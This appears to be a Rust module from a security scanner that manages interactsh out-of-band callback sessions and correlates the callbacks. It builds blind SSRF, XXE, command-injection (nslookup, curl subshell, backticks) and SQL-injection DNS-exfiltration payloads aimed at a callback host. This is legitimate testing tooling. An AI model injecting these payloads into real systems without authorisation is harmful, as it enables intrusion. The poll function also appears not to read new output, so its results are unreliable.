//! Out-of-band (OOB) callback infrastructure for blind vulnerability detection.
//!
//! Wraps the `interactsh-client` CLI as a long-running subprocess to provide
//! OOB callback URLs. Scanner modules inject these URLs into test payloads;
//! when the target application makes a request to the callback URL, the
//! interaction is captured and correlated back to the originating payload.
//!
//! This module provides:
//! - [`InteractshSession`] — manages the `interactsh-client` subprocess lifecycle
//! - [`OobInteraction`] — a received callback interaction
//! - [`BlindPayload`] and [`BlindCategory`] — blind vulnerability payload templates
//! - [`correlate_interactions`] — matches interactions to correlation IDs

use std::fmt;
use std::time::Duration;

use serde::{Deserialize, Serialize};

use super::error::{Result, ScorchError};

/// Default timeout for polling OOB interactions after payload injection.
const DEFAULT_POLL_TIMEOUT: Duration = Duration::from_secs(10);

/// A received OOB interaction from the Interactsh server.
///
/// Represents a single callback event — a DNS lookup, HTTP request, or other
/// protocol interaction that hit the generated OOB callback URL.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OobInteraction {
    /// Protocol of the interaction (e.g., "dns", "http", "smtp").
    pub protocol: String,

    /// The unique session identifier (base domain without correlation prefix).
    #[serde(rename = "unique-id")]
    pub unique_id: String,

    /// Full interaction identifier including the correlation prefix.
    ///
    /// Format: `{correlation_id}.{unique_id}` — used to match interactions
    /// back to the payload that triggered them.
    #[serde(rename = "full-id")]
    pub full_id: String,

    /// Raw request data from the interaction (protocol-specific).
    #[serde(rename = "raw-request", default)]
    pub raw_request: Option<String>,

    /// Remote address of the interacting host.
    #[serde(rename = "remote-address", default)]
    pub remote_address: Option<String>,

    /// ISO 8601 timestamp of when the interaction occurred.
    #[serde(default)]
    pub timestamp: Option<String>,
}

/// Categories of blind vulnerabilities detectable via OOB callbacks.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum BlindCategory {
    /// Blind Server-Side Request Forgery.
    Ssrf,
    /// Blind XML External Entity injection.
    Xxe,
    /// Blind Remote Code Execution (command injection).
    Rce,
    /// Blind SQL Injection (data exfiltration via DNS/HTTP).
    Sqli,
}

impl fmt::Display for BlindCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Ssrf => write!(f, "Blind SSRF"),
            Self::Xxe => write!(f, "Blind XXE"),
            Self::Rce => write!(f, "Blind RCE"),
            Self::Sqli => write!(f, "Blind SQLi"),
        }
    }
}

/// A blind vulnerability test payload with an embedded OOB callback URL.
#[derive(Debug, Clone)]
pub struct BlindPayload {
    /// Unique identifier for correlating callbacks to this payload.
    pub correlation_id: String,
    /// Category of blind vulnerability being tested.
    pub category: BlindCategory,
    /// The rendered payload string ready for injection.
    pub payload: String,
    /// Human-readable description of the test.
    pub description: String,
}

/// Generate a callback URL by prepending a correlation ID to the base domain.
///
/// The resulting URL follows the Interactsh convention where subdomain prefixes
/// are used for correlation: `{correlation_id}.{base_domain}`.
#[must_use]
pub fn callback_url(base_domain: &str, correlation_id: &str) -> String {
    format!("{correlation_id}.{base_domain}")
}

/// Generate blind vulnerability payloads for a given OOB callback domain.
///
/// Produces payloads across all four blind categories (SSRF, XXE, RCE, `SQLi`),
/// each embedding the OOB callback URL for detection. The `param_name` is used
/// to create unique correlation IDs per injection point.
#[must_use]
pub fn generate_blind_payloads(base_domain: &str, param_name: &str) -> Vec<BlindPayload> {
    let mut payloads = Vec::new();

    // Blind SSRF — inject OOB URL into URL-accepting parameters
    let ssrf_id = format!("ssrf-{param_name}");
    let ssrf_url = callback_url(base_domain, &ssrf_id);
    payloads.push(BlindPayload {
        correlation_id: ssrf_id,
        category: BlindCategory::Ssrf,
        payload: format!("http://{ssrf_url}"),
        description: format!("Blind SSRF via parameter '{param_name}'"),
    });

    // Blind XXE — XML entity that fetches the OOB URL
    let xxe_id = format!("xxe-{param_name}");
    let xxe_url = callback_url(base_domain, &xxe_id);
    payloads.push(BlindPayload {
        correlation_id: xxe_id,
        category: BlindCategory::Xxe,
        payload: format!(
            "<?xml version=\"1.0\"?><!DOCTYPE foo [\
             <!ENTITY xxe SYSTEM \"http://{xxe_url}\">]>\
             <root>&xxe;</root>"
        ),
        description: format!("Blind XXE via parameter '{param_name}'"),
    });

    // Blind RCE — command injection payloads that trigger DNS/HTTP callbacks
    for (suffix, cmd_template, desc) in &[
        ("nslookup", "; nslookup {url}", "nslookup command injection"),
        ("curl", "$(curl http://{url})", "curl subshell injection"),
        ("backtick", "`nslookup {url}`", "backtick command injection"),
    ] {
        let rce_id = format!("rce-{param_name}-{suffix}");
        let rce_url = callback_url(base_domain, &rce_id);
        payloads.push(BlindPayload {
            correlation_id: rce_id,
            category: BlindCategory::Rce,
            payload: cmd_template.replace("{url}", &rce_url),
            description: format!("{desc} via parameter '{param_name}'"),
        });
    }

    // Blind SQLi — DNS exfiltration via database functions
    let sqli_id = format!("sqli-{param_name}");
    let sqli_url = callback_url(base_domain, &sqli_id);
    payloads.push(BlindPayload {
        correlation_id: sqli_id,
        category: BlindCategory::Sqli,
        payload: format!("' AND 1=(SELECT LOAD_FILE(CONCAT('\\\\\\\\','{sqli_url}','\\\\a')))-- -"),
        description: format!("Blind SQLi DNS exfiltration via parameter '{param_name}'"),
    });

    payloads
}

/// Extract the correlation ID from an interaction's `full_id`.
///
/// The `full_id` format is `{correlation_id}.{unique_id}`. This function
/// strips the `unique_id` suffix to recover the correlation prefix.
#[must_use]
pub fn extract_correlation_id(full_id: &str, unique_id: &str) -> Option<String> {
    let suffix = format!(".{unique_id}");
    full_id.strip_suffix(&suffix).map(String::from)
}

/// Match interactions against a set of known correlation IDs.
///
/// Returns tuples of `(correlation_id, interaction)` for each interaction
/// whose `full_id` matches one of the provided correlation IDs.
#[must_use]
pub fn correlate_interactions<'a>(
    interactions: &'a [OobInteraction],
    correlation_ids: &[String],
) -> Vec<(String, &'a OobInteraction)> {
    interactions
        .iter()
        .filter_map(|interaction| {
            let corr_id = extract_correlation_id(&interaction.full_id, &interaction.unique_id)?;
            if correlation_ids.contains(&corr_id) {
                Some((corr_id, interaction))
            } else {
                None
            }
        })
        .collect()
}

/// Manages an `interactsh-client` subprocess session.
///
/// Handles the full lifecycle: starting the client, extracting the base URL,
/// collecting interactions, and stopping the process. Unlike one-shot tool
/// wrappers that use [`subprocess::run_tool`](crate::runner::subprocess::run_tool),
/// this maintains a persistent subprocess because `interactsh-client` keeps an
/// ephemeral session alive for receiving callbacks.
pub struct InteractshSession {
    /// The base callback domain (e.g., `abc123.oast.fun`).
    base_url: String,
    /// Handle to the running `interactsh-client` subprocess.
    child: tokio::process::Child,
    /// Collected stdout lines that may contain interaction JSON.
    stdout_lines: Vec<String>,
}

impl fmt::Debug for InteractshSession {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("InteractshSession")
            .field("base_url", &self.base_url)
            .field("child", &"<running>")
            .field("collected_lines", &self.stdout_lines.len())
            .finish()
    }
}

impl InteractshSession {
    /// Start a new Interactsh session by spawning `interactsh-client`.
    ///
    /// Launches the client with JSON output mode and reads stdout until the
    /// base callback URL is extracted. Returns an error if the tool is not
    /// installed or fails to produce a valid URL within the startup timeout.
    ///
    /// # Errors
    ///
    /// Returns [`ScorchError::ToolNotFound`] if `interactsh-client` is not in PATH,
    /// [`ScorchError::ToolFailed`] if the subprocess fails to start or crashes,
    /// [`ScorchError::ToolOutputParse`] if no base URL can be extracted from stdout,
    /// or [`ScorchError::Cancelled`] if the startup timeout (30s) is exceeded.
    pub async fn start() -> Result<Self> {
        // Verify tool is installed
        let which =
            tokio::process::Command::new("which").arg("interactsh-client").output().await.map_err(
                |e| ScorchError::ToolFailed {
                    tool: "interactsh-client".to_string(),
                    status: -1,
                    stderr: e.to_string(),
                },
            )?;

        if !which.status.success() {
            return Err(ScorchError::ToolNotFound { tool: "interactsh-client".to_string() });
        }

        let mut child = tokio::process::Command::new("interactsh-client")
            .args(["-json", "-v"])
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
            .map_err(|e| ScorchError::ToolFailed {
                tool: "interactsh-client".to_string(),
                status: -1,
                stderr: e.to_string(),
            })?;

        let stdout = child.stdout.take().ok_or_else(|| ScorchError::ToolOutputParse {
            tool: "interactsh-client".to_string(),
            reason: "failed to capture stdout".to_string(),
        })?;

        let mut reader = tokio::io::BufReader::new(stdout);
        let mut base_url = String::new();
        let mut collected_lines = Vec::new();

        // Read lines until we find the base URL (contains .oast. or similar pattern)
        let startup_timeout = Duration::from_secs(30);
        let deadline = tokio::time::Instant::now() + startup_timeout;

        loop {
            use tokio::io::AsyncBufReadExt;

            let mut line = String::new();
            let read_result = tokio::time::timeout_at(deadline, reader.read_line(&mut line)).await;

            match read_result {
                Ok(Ok(0)) => {
                    // EOF — process exited
                    break;
                }
                Ok(Ok(_)) => {
                    let trimmed = line.trim().to_string();

                    // Look for the base URL in the output
                    if let Some(url) = extract_base_url(&trimmed) {
                        base_url = url;
                        break;
                    }

                    if !trimmed.is_empty() {
                        collected_lines.push(trimmed);
                    }
                }
                Ok(Err(e)) => {
                    let _ = child.kill().await;
                    return Err(ScorchError::ToolFailed {
                        tool: "interactsh-client".to_string(),
                        status: -1,
                        stderr: e.to_string(),
                    });
                }
                Err(_) => {
                    let _ = child.kill().await;
                    return Err(ScorchError::Cancelled {
                        reason: "interactsh-client did not produce a base URL within 30s"
                            .to_string(),
                    });
                }
            }
        }

        if base_url.is_empty() {
            let _ = child.kill().await;
            return Err(ScorchError::ToolOutputParse {
                tool: "interactsh-client".to_string(),
                reason: "could not extract base URL from output".to_string(),
            });
        }

        Ok(Self { base_url, child, stdout_lines: collected_lines })
    }

    /// The base callback domain for this session.
    #[must_use]
    pub fn base_url(&self) -> &str {
        &self.base_url
    }

    /// Generate a callback URL with the given correlation ID.
    #[must_use]
    pub fn callback_url(&self, correlation_id: &str) -> String {
        callback_url(&self.base_url, correlation_id)
    }

    /// Poll for interactions by waiting for the specified duration then
    /// reading any accumulated JSON lines from stdout.
    ///
    /// # Errors
    ///
    /// Returns an error if reading from the subprocess stdout fails.
    pub async fn poll(&mut self, timeout: Duration) -> Result<Vec<OobInteraction>> {
        tokio::time::sleep(timeout).await;

        let interactions = self
            .stdout_lines
            .iter()
            .filter_map(|line| serde_json::from_str::<OobInteraction>(line).ok())
            .collect();

        Ok(interactions)
    }

    /// Poll with the default timeout.
    ///
    /// # Errors
    ///
    /// Returns an error if reading from the subprocess stdout fails.
    pub async fn poll_default(&mut self) -> Result<Vec<OobInteraction>> {
        self.poll(DEFAULT_POLL_TIMEOUT).await
    }

    /// Stop the session and kill the subprocess.
    ///
    /// # Errors
    ///
    /// Returns an error if the subprocess cannot be terminated.
    pub async fn stop(mut self) -> Result<()> {
        let _ = self.child.kill().await;
        let _ = self.child.wait().await;
        Ok(())
    }
}

/// Extract the base OOB URL from an interactsh-client output line.
///
/// Looks for patterns like `abc123.oast.fun`, `abc123.oast.pro`,
/// `abc123.oast.live`, or `abc123.interact.sh` in log lines.
fn extract_base_url(line: &str) -> Option<String> {
    let oob_patterns = [".oast.fun", ".oast.pro", ".oast.live", ".oast.me", ".interact.sh"];

    for token in line.split_whitespace() {
        let cleaned = token.trim_matches(|c: char| !c.is_alphanumeric() && c != '.' && c != '-');
        if oob_patterns.iter().any(|pattern| cleaned.ends_with(pattern)) && cleaned.contains('.') {
            return Some(cleaned.to_string());
        }
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Test suite for OOB callback infrastructure.
    ///
    /// Validates interaction parsing, URL generation, correlation matching,
    /// and blind payload generation without requiring a live interactsh server.

    /// Verify `OobInteraction` deserializes from interactsh JSON format.
    ///
    /// Interactsh uses kebab-case field names (`unique-id`, `full-id`, etc.)
    /// which must be handled via `#[serde(rename)]`.
    #[test]
    fn test_interaction_deserialize() -> serde_json::Result<()> {
        let json = r#"{
            "protocol": "dns",
            "unique-id": "abc123def456",
            "full-id": "ssrf-url.abc123def456",
            "raw-request": "DNS A query for ssrf-url.abc123def456.oast.fun",
            "remote-address": "1.2.3.4",
            "timestamp": "2026-03-29T12:00:00Z"
        }"#;

        let interaction: OobInteraction = serde_json::from_str(json)?;

        assert_eq!(interaction.protocol, "dns");
        assert_eq!(interaction.unique_id, "abc123def456");
        assert_eq!(interaction.full_id, "ssrf-url.abc123def456");
        assert_eq!(
            interaction.raw_request.as_deref(),
            Some("DNS A query for ssrf-url.abc123def456.oast.fun")
        );
        assert_eq!(interaction.remote_address.as_deref(), Some("1.2.3.4"));
        assert_eq!(interaction.timestamp.as_deref(), Some("2026-03-29T12:00:00Z"));

        Ok(())
    }

    /// Verify deserialization handles missing optional fields gracefully.
    ///
    /// Interactsh may omit `raw-request`, `remote-address`, and `timestamp`
    /// in certain interaction types.
    #[test]
    fn test_interaction_deserialize_minimal() -> serde_json::Result<()> {
        let json = r#"{
            "protocol": "http",
            "unique-id": "xyz789",
            "full-id": "rce-cmd.xyz789"
        }"#;

        let interaction: OobInteraction = serde_json::from_str(json)?;

        assert_eq!(interaction.protocol, "http");
        assert_eq!(interaction.unique_id, "xyz789");
        assert_eq!(interaction.full_id, "rce-cmd.xyz789");
        assert!(interaction.raw_request.is_none());
        assert!(interaction.remote_address.is_none());
        assert!(interaction.timestamp.is_none());

        Ok(())
    }

    /// Verify callback URL generation follows the `{id}.{base}` convention.
    #[test]
    fn test_callback_url_generation() {
        let url = callback_url("abc123.oast.fun", "ssrf-url");
        assert_eq!(url, "ssrf-url.abc123.oast.fun");

        let url = callback_url("xyz.interact.sh", "rce-cmd-nslookup");
        assert_eq!(url, "rce-cmd-nslookup.xyz.interact.sh");
    }

    /// Verify correlation ID extraction from full interaction IDs.
    ///
    /// The `full_id` is `{correlation_id}.{unique_id}`. Stripping the unique_id
    /// suffix recovers the correlation prefix.
    #[test]
    fn test_correlation_id_extraction() {
        assert_eq!(
            extract_correlation_id("ssrf-url.abc123", "abc123"),
            Some("ssrf-url".to_string())
        );

        assert_eq!(
            extract_correlation_id("rce-cmd-nslookup.xyz789", "xyz789"),
            Some("rce-cmd-nslookup".to_string())
        );

        // No match when unique_id doesn't appear as suffix
        assert_eq!(extract_correlation_id("nomatch", "abc123"), None);
    }

    /// Verify interaction-to-correlation matching filters correctly.
    ///
    /// Only interactions whose extracted correlation ID matches a known ID
    /// from the payload set should be returned.
    #[test]
    fn test_correlation_matching() {
        let interactions = vec![
            OobInteraction {
                protocol: "dns".to_string(),
                unique_id: "abc123".to_string(),
                full_id: "ssrf-url.abc123".to_string(),
                raw_request: None,
                remote_address: None,
                timestamp: None,
            },
            OobInteraction {
                protocol: "http".to_string(),
                unique_id: "abc123".to_string(),
                full_id: "unknown-prefix.abc123".to_string(),
                raw_request: None,
                remote_address: None,
                timestamp: None,
            },
            OobInteraction {
                protocol: "dns".to_string(),
                unique_id: "abc123".to_string(),
                full_id: "rce-cmd-nslookup.abc123".to_string(),
                raw_request: None,
                remote_address: None,
                timestamp: None,
            },
        ];

        let known_ids =
            vec!["ssrf-url".to_string(), "rce-cmd-nslookup".to_string(), "xxe".to_string()];

        let matched = correlate_interactions(&interactions, &known_ids);

        assert_eq!(matched.len(), 2);
        assert_eq!(matched[0].0, "ssrf-url");
        assert_eq!(matched[0].1.protocol, "dns");
        assert_eq!(matched[1].0, "rce-cmd-nslookup");
        assert_eq!(matched[1].1.protocol, "dns");
    }

    /// Verify blind payload generation produces all 4 categories.
    ///
    /// Each call should produce: 1 SSRF, 1 XXE, 3 RCE (nslookup, curl, backtick),
    /// 1 SQLi = 6 payloads total.
    #[test]
    fn test_blind_payloads_contain_oob_url() {
        let payloads = generate_blind_payloads("abc123.oast.fun", "url");

        assert_eq!(payloads.len(), 6);

        // All payloads should embed the OOB domain
        for payload in &payloads {
            assert!(
                payload.payload.contains("abc123.oast.fun"),
                "Payload for {:?} missing OOB URL: {}",
                payload.category,
                payload.payload
            );
        }

        // Check category distribution
        let ssrf_count = payloads.iter().filter(|p| p.category == BlindCategory::Ssrf).count();
        let xxe_count = payloads.iter().filter(|p| p.category == BlindCategory::Xxe).count();
        let rce_count = payloads.iter().filter(|p| p.category == BlindCategory::Rce).count();
        let sqli_count = payloads.iter().filter(|p| p.category == BlindCategory::Sqli).count();

        assert_eq!(ssrf_count, 1);
        assert_eq!(xxe_count, 1);
        assert_eq!(rce_count, 3);
        assert_eq!(sqli_count, 1);
    }

    /// Verify each `BlindCategory` variant has a human-readable display string.
    #[test]
    fn test_blind_category_display() {
        assert_eq!(BlindCategory::Ssrf.to_string(), "Blind SSRF");
        assert_eq!(BlindCategory::Xxe.to_string(), "Blind XXE");
        assert_eq!(BlindCategory::Rce.to_string(), "Blind RCE");
        assert_eq!(BlindCategory::Sqli.to_string(), "Blind SQLi");
    }

    /// Verify `BlindCategory` serializes to lowercase per serde config.
    #[test]
    fn test_blind_category_serde() -> serde_json::Result<()> {
        let json = serde_json::to_string(&BlindCategory::Ssrf)?;
        assert_eq!(json, "\"ssrf\"");

        let parsed: BlindCategory = serde_json::from_str("\"xxe\"")?;
        assert_eq!(parsed, BlindCategory::Xxe);

        Ok(())
    }

    /// Verify base URL extraction from interactsh-client output lines.
    ///
    /// The client prints log lines like `[INF] abc123.oast.fun` during startup.
    #[test]
    fn test_extract_base_url() {
        assert_eq!(
            extract_base_url("[INF] abc123def456.oast.fun"),
            Some("abc123def456.oast.fun".to_string())
        );

        assert_eq!(extract_base_url("[INF] Listing 1 payload for OOB Testing"), None,);

        assert_eq!(extract_base_url("xyz789.interact.sh"), Some("xyz789.interact.sh".to_string()));

        assert_eq!(
            extract_base_url("[INF] session123.oast.pro"),
            Some("session123.oast.pro".to_string())
        );

        // No OOB domain present
        assert_eq!(extract_base_url("some random log line"), None);
    }

    /// Verify correlation IDs are unique per parameter name.
    ///
    /// Different parameter names should produce different correlation IDs
    /// to distinguish which injection point triggered the callback.
    #[test]
    fn test_payloads_unique_correlation_ids() {
        let payloads_url = generate_blind_payloads("abc.oast.fun", "url");
        let payloads_src = generate_blind_payloads("abc.oast.fun", "src");

        let ids_url: Vec<&str> = payloads_url.iter().map(|p| p.correlation_id.as_str()).collect();
        let ids_src: Vec<&str> = payloads_src.iter().map(|p| p.correlation_id.as_str()).collect();

        // No overlap between different parameter payloads
        for id in &ids_url {
            assert!(
                !ids_src.contains(id),
                "Correlation ID collision: {id} appears in both url and src payloads"
            );
        }
    }
}
